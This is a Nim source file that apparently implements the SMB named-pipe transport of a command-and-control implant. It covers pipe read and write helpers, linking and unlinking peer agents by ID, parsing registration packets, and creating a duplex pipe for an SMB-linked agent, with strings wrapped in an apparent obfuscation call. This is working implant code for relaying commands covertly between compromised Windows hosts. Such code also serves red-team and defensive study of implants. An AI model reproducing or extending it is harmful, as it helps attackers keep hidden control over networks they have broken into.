import winim/lean
import system, tables
import ../../utils/io
import ../../../../common/[types, utils, serialize]

const PIPE_BUFFER_MAX = 0x10000 # 65536 

# Helper functions
proc pipeWrite*(hPipe: HANDLE, data: seq[byte]): bool {.discardable.} = 
    var 
        dwBytesWritten: DWORD = 0
        dwTotal: DWORD = 0
    
    while dwTotal < cast[DWORD](data.len()):             
        if WriteFile(hPipe, cast[LPCVOID](addr data[dwTotal]), min(cast[DWORD](data.len()) - dwTotal, PIPE_BUFFER_MAX), addr dwBytesWritten, NULL) == FALSE: 
            return false
        dwTotal += dwBytesWritten
    
    FlushFileBuffers(hPipe)
    return true

proc pipeRead*(hPipe: HANDLE, size: DWORD): seq[byte] = 
    var 
        dwBytesRead: DWORD = 0
        dwTotal: DWORD = 0
    
    result = newSeq[byte](size)
    while dwTotal < size:            
        if ReadFile(hPipe, cast[LPVOID](addr result[dwTotal]), min(size - dwTotal, PIPE_BUFFER_MAX), addr dwBytesRead, NULL) == FALSE:
            if GetLastError() != ERROR_MORE_DATA:
                return @[]
        dwTotal += dwBytesRead

proc smbRead*(ctx: AgentCtx, hPipe: HANDLE): string = 
    var 
        dwSize: DWORD = 0
        temp: seq[byte] = @[]
        data: seq[byte] = @[]

    if PeekNamedPipe(hPipe, NULL, 0, NULL, addr dwSize, NULL) == FALSE:
        when defined(TRANSPORT_SMB):
            ctx.registered = false
            DisconnectNamedPipe(ctx.transport.hPipe)
            CloseHandle(ctx.transport.hPipe)
            ctx.transport.hPipe = 0
        return ""

    # Read data until pipe is empty (for messages that exceed the size limit of the named pipe)
    while dwSize > 0:
        temp = hPipe.pipeRead(dwSize)
        if temp.len() == 0:
            return Bytes.toString(data)
        data.add(temp)
        
        if PeekNamedPipe(hPipe, NULL, 0, NULL, addr dwSize, NULL) == FALSE:
            break
    
    return Bytes.toString(data)

# Agent linking
proc link*(ctx: AgentCtx, pipeName: string): seq[byte] =   
    var 
        hPipe: HANDLE = 0
        dwSize: DWORD = 0
        dwBytesRead: DWORD = 0
        data: seq[byte]

    # Connect to named pipe 
    hPipe = CreateFileW(+$pipeName, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, 0)
    if hPipe == INVALID_HANDLE_VALUE: 
        raise newException(CatchableError, GetLastError().getError())
    
    if GetLastError() == ERROR_PIPE_BUSY:
        # https://learn.microsoft.com/de-de/windows/win32/api/namedpipeapi/nf-namedpipeapi-waitnamedpipew
        if WaitNamedPipeW(+$pipeName, 5000) == FALSE:
            raise newException(CatchableError, GetLastError().getError())

    while true:
        # https://learn.microsoft.com/de-de/windows/win32/api/namedpipeapi/nf-namedpipeapi-peeknamedpipe
        if PeekNamedPipe(hPipe, NULL, 0, NULL, addr dwSize, NULL) == FALSE:
            CloseHandle(hPipe)
            raise newException(CatchableError, GetLastError().getError())

        if dwSize > 0:
            data = newSeq[byte](dwSize)
            if ReadFile(hPipe, cast[LPVOID](addr data[0]), dwSize, addr dwBytesRead, NULL) == FALSE:
                CloseHandle(hPipe)
                raise newException(CatchableError, GetLastError().getError())            
            break 
    
    # Parse registration packet
    var unpacker = Unpacker.init(Bytes.toString(data))
    discard unpacker.getUint8()
    discard unpacker.getUint32()
    let agentId = unpacker.deserializeHeader().agentId

    ctx.links[cast[uint32](agentId)] = cast[uint32](hPipe)

    return data
    
proc unlink*(ctx: AgentCtx, agentId: string) = 
    if not ctx.links.hasKey(string.toUuid(agentId)): 
        raise newException(CatchableError, protect("Linked agent not found."))
    
    let hPipe = cast[HANDLE](ctx.links[string.toUuid(agentId)])
    if CloseHandle(hPipe) == FALSE:
        raise newException(CatchableError, GetLastError().getError())
          
    ctx.links.del(string.toUuid(agentId))

when defined(TRANSPORT_SMB):
    type 
        SMB_PIPE_SEC_ATTR = object 
            Sid: PSID 
            SidLow: PSID 
            SAcl: PACL 
            SecDec: PSECURITY_DESCRIPTOR
        
        PSMB_PIPE_SEC_ATTR = ptr SMB_PIPE_SEC_ATTR
    
    proc openSmbSecurityAttributes(smbSecAttr: PSMB_PIPE_SEC_ATTR, secAttr: PSECURITY_ATTRIBUTES) = 
        discard 
    
    proc freeSmbSecurityAttributes(smbSecAttr: PSMB_PIPE_SEC_ATTR) = 
        discard
    
    proc createPipe*(ctx: AgentCtx) = 
        var 
            smbSecAttr: SMB_PIPE_SEC_ATTR
            secAttr: SECURITY_ATTRIBUTES  
        
        openSmbSecurityAttributes(addr smbSecAttr, addr secAttr)
        
        ctx.transport.hPipe = CreateNamedPipeW(
            +$ctx.transport.pipe,                                       # Pipe name
            PIPE_ACCESS_DUPLEX,                                         # R/W access
            PIPE_TYPE_MESSAGE or PIPE_READMODE_MESSAGE or PIPE_WAIT,    # Pipe modes
            PIPE_UNLIMITED_INSTANCES,                                   # Max. instances
            PIPE_BUFFER_MAX,                                            # Output buffer
            PIPE_BUFFER_MAX,                                            # Input buffer
            0,                                                          # Client timeout
            addr secAttr                                                # Security attributes
        )
        
        freeSmbSecurityAttributes(addr smbSecAttr)
        
        if ctx.transport.hPipe == INVALID_HANDLE_VALUE:
            ctx.transport.hPipe = 0
            raise newException(CatchableError, protect("Failed to create pipe"))
    
    proc smbWrite*(ctx: AgentCtx, data: seq[byte]): bool = 
        # Create pipe and wait for SMB agent to get linked
        if ctx.transport.hPipe == 0:
            ctx.createPipe()
            print protect("Waiting for connection.")
            if ConnectNamedPipe(ctx.transport.hPipe, NULL) == FALSE:
                if GetLastError() != ERROR_PIPE_CONNECTED:
                    CloseHandle(ctx.transport.hPipe)
                    ctx.transport.hPipe = 0
                    return false
            return ctx.transport.hPipe.pipeWrite(data)
        
        # Pipe was already created, write data to the pipe
        if not ctx.transport.hPipe.pipeWrite(data):
            let err = GetLastError()
            if err == ERROR_NO_DATA:
                CloseHandle(ctx.transport.hPipe)
                ctx.transport.hPipe = 0
                return false
        
        return true